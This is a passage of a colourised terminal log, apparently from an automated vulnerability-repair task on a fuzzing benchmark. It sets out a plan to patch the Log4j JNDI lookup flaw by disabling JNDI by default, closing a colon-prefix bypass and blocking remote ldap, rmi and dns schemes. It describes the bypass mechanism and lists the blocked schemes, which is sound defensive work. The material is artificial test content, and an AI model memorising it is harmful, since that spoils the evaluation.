[2;36m                    [0m         [39m    [0m[35m/[0m[35m/[0m[39m Only process simple names or jav[0m[1;92ma:c[0m[39momp/env/* paths[0m                           [2m                [0m
[2;36m                    [0m         [39m    if [0m[1;39m([0m[39m![0m[1;35mjndiName.startsWith[0m[1;39m([0m[39mCONTAINER_JNDI_RESOURCE_PATH_PREFIX[0m[1;39m)[0m[39m && [0m               [2m                [0m
[2;36m                    [0m         [39m        ![0m[1;35mjndiName.startsWith[0m[1;39m([0m[32m"java:"[0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                                            [2m                [0m
[2;36m                    [0m         [39m        [0m[35m/[0m[35m/[0m[39m Simple name without scheme - add container prefix[0m                        [2m                [0m
[2;36m                    [0m         [39m        jndiName = CONTAINER_JNDI_RESOURCE_PATH_PREFIX + jndiName;[0m                  [2m                [0m
[2;36m                    [0m         [39m    [0m[1;39m}[0m                                                                               [2m                [0m
[2;36m                    [0m         [39m    return jndiName;[0m                                                                [2m                [0m
[2;36m                    [0m         [1;39m}[0m                                                                                   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Rationale**: Remove the colon-based bypass that allows remote URLs. The new logic[0m [2m                [0m
[2;36m                    [0m         [39mexplicitly checks for the safe [0m[32m"java:"[0m[39m prefix rather than any colon, preventing [0m    [2m                [0m
[2;36m                    [0m         [32m"ldap:"[0m[39m, [0m[32m"rmi:"[0m[39m, etc. from bypassing the prefix.[0m                                    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Implementation Steps from Initial Codebase[0m                                      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **Step [0m[1;36m1[0m[39m**: Modify `JndiLookup.java` line [0m[1;36m31[0m[39m to integrate PropertiesUtil and [0m    [2m                [0m
[2;36m                    [0m         [39mdefault to false[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **Step [0m[1;36m2[0m[39m**: Add import for PropertiesUtil at the top of JndiLookup.java[0m          [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **Step [0m[1;36m3[0m[39m**: Add the `[0m[1;35misAllowedJndiUrl[0m[1;39m([0m[1;39m)[0m[39m` validation method in JndiLookup.java [0m   [2m                [0m
[2;36m                    [0m         [39mafter line [0m[1;36m64[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. **Step [0m[1;36m4[0m[39m**: Modify the `[0m[1;35mlookup[0m[1;39m([0m[39mLogEvent, String[0m[1;39m)[0m[39m` method in JndiLookup.java to [0m  [2m                [0m
[2;36m                    [0m         [39mcall validation before performing lookup[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m. **Step [0m[1;36m5[0m[39m**: Simplify `[0m[1;35mconvertJndiName[0m[1;39m([0m[1;39m)[0m[39m` method in JndiLookup.java to remove [0m    [2m                [0m
[2;36m                    [0m         [39mcolon-based logic[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m. **Step [0m[1;36m6[0m[39m**: Remove line [0m[1;36m66[0m[39m from Interpolator.java's no-arg constructor[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m. **Step [0m[1;36m7[0m[39m**: Add [0m[1;35mLOGGER.warn[0m[1;39m([0m[1;39m)[0m[39m call for rejected JNDI lookups [0m[1;39m([0m[39mimport [0m            [2m                [0m
[2;36m                    [0m         [39mStatusLogger if needed[0m[1;39m)[0m                                                             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Justification[0m                                                                   [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Why This is Optimal**:[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **Defense in Depth**: Multiple independent layers of protection ensure that even[0m [2m                [0m
[2;36m                    [0m         [39mif one layer is bypassed, others provide security[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **Backward Compatibility**: Legitimate JNDI usage can be restored via system [0m    [2m                [0m
[2;36m                    [0m         [39mproperty [0m[1;39m([0m[39mlog4j2.[0m[33menableJndi[0m[39m=[0m[35mtrue[0m[1;39m)[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **Zero Impact on Safe Lookups**: sys, env, date, map, and other lookups continue[0m [2m                [0m
[2;36m                    [0m         [39mworking normally[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. **Minimal Code Changes**: Focused modifications to only the vulnerable [0m          [2m                [0m
[2;36m                    [0m         [39mcomponents[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m. **Follows Existing Patterns**: URL validation mirrors [0m[1;35mFileUtils.fileFromURI[0m[1;39m([0m[1;39m)[0m[39m [0m   [2m                [0m
[2;36m                    [0m         [39mpattern; property integration follows PropertiesUtil patterns[0m                       [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**How It Preserves Existing Logic**:[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. All safe lookup functionality remains intact [0m[1;39m([0m[39mSystemProperties, Environment, [0m    [2m                [0m
[2;36m                    [0m         [39mMap, Date, etc.[0m[1;39m)[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. Configuration file substitution continues to work for non-JNDI lookups[0m           [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. PatternLayout, StrSubstitutor, and Interpolator core logic unchanged[0m             [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. Plugin discovery mechanism unaffected[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m. Test suite for non-JNDI functionality continues to pass[0m                          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**How It Addresses the Vulnerability**:[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **Blocks Remote JNDI by Default**: [0m[33mENABLE_JNDI[0m[39m=[0m[35mfalse[0m[39m prevents any JNDI lookups [0m  [2m                [0m
[2;36m                    [0m         [39munless explicitly enabled[0m                                                           [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **Validates JNDI URLs**: Even if enabled, remote URLs [0m[1;39m([0m[39mldap:[0m[35m/[0m[35m/[0m[39m, rmi:[0m[35m/[0m[35m/[0m[39m, dns:[0m[35m/[0m[35m/[0m[1;39m)[0m[39m [0m [2m                [0m
[2;36m                    [0m         [39mare blocked[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **Removes Auto-Registration**: JNDI lookup not available by default in [0m          [2m                [0m
[2;36m                    [0m         [39mInterpolator[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. **Closes convertJndiName Bypass**: Colon-based logic no longer allows remote [0m    [2m                [0m
[2;36m                    [0m         [39mschemes[0m                                                                             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Potential Side Effects and Mitigation**:[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **Side Effect**: Applications using JNDI lookups in configuration will stop [0m     [2m                [0m
[2;36m                    [0m         [39mworking[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m   - **Mitigation**: Clear documentation on setting log4j2.[0m[33menableJndi[0m[39m=[0m[35mtrue[0m[39m system [0m  [2m                [0m
[2;36m                    [0m         [39mproperty[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m   - **Justification**: Security over convenience; legitimate use cases are rare[0m    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **Side Effect**: JndiLookup tests will fail if they use remote URLs[0m              [2m                [0m
[2;36m                    [0m         [39m   - **Mitigation**: Update tests to only test local JNDI resources [0m                [2m                [0m
[2;36m                    [0m         [1;39m([0m[39mjav[0m[1;92ma:c[0m[39momp/env/*[0m[1;39m)[0m                                                                   [2m                [0m
[2;36m                    [0m         [39m   - **Note**: Existing tests already use MockContextFactory with local resources[0m   [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **Side Effect**: Plugin discovery won't auto-register JndiLookup[0m                 [2m                [0m
[2;36m                    [0m         [39m   - **Mitigation**: Not needed since default constructor doesn't register it [0m      [2m                [0m
[2;36m                    [0m         [39meither[0m                                                                              [2m                [0m
[2;36m                    [0m         [39m   - **Justification**: Consistent with the disabled-by-default approach[0m            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Similar Solutions in Codebase**:[0m                                                  [2m                [0m
[2;36m                    [0m         [39m- [0m[1;35mFileUtils.fileFromURI[0m[1;39m([0m[1;39m)[0m[39m uses scheme whitelisting [0m[1;39m([0m[39mlines [0m[1;36m53[0m[39m-[0m[1;36m54[0m[1;39m)[0m[39m - we apply same [0m   [2m                [0m
[2;36m                    [0m         [39mpattern[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m- SystemPropertiesLookup and EnvironmentLookup show safe local-only lookup pattern[0m  [2m                [0m
[2;36m                    [0m         [39m- PropertiesUtil integration for system properties used throughout codebase[0m         [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Critical Constraints Honored[0m                                                    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. ✅ **No Harness Code Modification**: The fix only modifies JndiLookup.java and [0m  [2m                [0m
[2;36m                    [0m         [39mInterpolator.java, not the fuzzer harness[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. ✅ **No External Library Patches**: All changes are within Log4j core code[0m       [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. ✅ **No Test Code Modification**: Fix is in production code; tests may need [0m     [2m                [0m
[2;36m                    [0m         [39mupdates separately but that's expected[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. ✅ **No Fuzzing Logic Changes**: The fuzzer can continue testing with the same [0m  [2m                [0m
[2;36m                    [0m         [39mpatterns[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m. ✅ **No Utility Function Breaking**: StrSubstitutor, Interpolator core logic [0m    [2m                [0m
[2;36m                    [0m         [39mpreserved[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m. ✅ **No Functionality Removal**: JNDI can be re-enabled; just not default[0m        [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m. ✅ **No Broad Exception Catching**: Specific validation returns null, existing [0m  [2m                [0m
[2;36m                    [0m         [39mNamingException handling preserved[0m                                                  [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
